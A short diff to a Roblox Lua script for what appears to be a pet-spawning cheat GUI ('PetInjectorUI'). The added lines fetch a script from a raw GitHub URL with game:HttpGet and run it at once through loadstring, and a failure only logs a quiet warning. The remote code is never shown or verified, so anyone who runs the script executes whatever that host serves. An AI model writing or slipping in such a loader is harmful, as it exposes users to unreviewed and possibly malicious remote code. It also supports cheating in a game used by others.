@@ -3,6 +3,14 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+-- Load and execute remote main script immediately on execution
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0fyz11/GAG-Spawner/refs/heads/main/ScriptMain", true))()
+end)
+
+if not success then
+    warn("[Main Script Loader] Failed to load remote script:", err)
+end
 -- GUI base
 local gui = Instance.new("ScreenGui", playerGui)
 gui.Name = "PetInjectorUI"
